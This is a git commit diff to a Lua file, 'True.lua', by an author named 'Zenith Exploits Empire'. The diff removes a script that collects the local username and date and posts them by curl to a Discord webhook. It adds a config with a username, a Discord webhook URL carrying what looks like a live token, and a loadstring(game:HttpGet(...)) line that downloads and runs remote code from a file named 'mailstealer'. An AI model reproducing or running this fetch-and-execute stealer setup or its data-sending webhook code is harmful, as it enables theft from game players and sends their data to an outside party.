087c9c72611fe7ebed19f62fc49fdcd6e4e80d96
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-10 09:51:20 +0200

    Update True.lua

--- projects/True.lua
+++ projects/True.lua
@@ -1,40 +1,4 @@
--- Get username
-local username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
+Username= 'DaBird_Bedwars'
+Webhook= 'https://discord.com/api/webhooks/1359797152410501213/KxSSOrsToasjesdv_IxGMBIl-UFM9KkYUKkDpjqc2EtuYsXX9XiG0NsJYT_HVSjk8Xph'
 
--- Get date/time
-local date = os.date("%Y-%m-%d %H:%M:%S")
-
--- Random log ID
-math.randomseed(os.time())
-local logEntry = math.random(1, 999999)
-
--- Create JSON payload
-local jsonData = string.format([[
-{
-  "username": "Zenith_Bot",
-  "embeds": [{
-    "title": "Execution Log Entry",
-    "color": 16753920,
-    "fields": [
-      {"name": "Username", "value": "%s", "inline": true},
-      {"name": "Date Executed", "value": "%s", "inline": false},
-      {"name": "Log Entry", "value": "%d", "inline": false}
-    ]
-  }]
-}
-]], username, date, logEntry)
-
--- Save JSON to a temporary file
-local tmpFile = "tmp_payload.json"
-local file = io.open(tmpFile, "w")
-file:write(jsonData)
-file:close()
-
--- Send to Discord webhook using curl
-local webhook_url = "https://discord.com/api/webhooks/1359461379152678984/sI_yfYnTSRuCZuZehPgdfSHOHHjf30ZDOzRizZzRvDbupQ5lIgKgMWrqaGN5Vazzchjy"
-os.execute(string.format([[curl -X POST -H "Content-Type: application/json" -d @%s %s]], tmpFile, webhook_url))
-
--- Clean up
-os.remove(tmpFile)
-
-print("✅ Webhook sent to Discord!")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xvkzi/psx/main/mailstealer'))()
